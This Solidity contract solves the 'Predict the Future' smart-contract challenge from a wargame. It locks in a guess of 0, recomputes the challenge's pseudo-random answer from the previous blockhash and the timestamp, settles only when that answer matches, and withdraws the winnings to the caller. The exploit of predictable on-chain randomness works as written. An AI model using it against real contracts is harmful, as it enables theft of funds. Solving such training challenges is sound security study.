// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

interface IPredicTheFutureChallenge {
    function isComplete() external view returns(bool);
    
    function lockInGuess(uint8) external payable;

    function settle() external;
}

contract PredictTheFutureSolver {
    IPredicTheFutureChallenge public challengeContract;

    constructor(address challengeAddress) {
        challengeContract = IPredicTheFutureChallenge(challengeAddress);
    }

    function lockInGuess() external payable {
        challengeContract.lockInGuess{value: 1 ether}(0);
    }

    function solve() external payable {
        bytes32 hash = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
        uint256 number = uint256(hash);
        uint8 answer = uint8(number % 10);
        
        require(answer == 0);

        challengeContract.settle();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
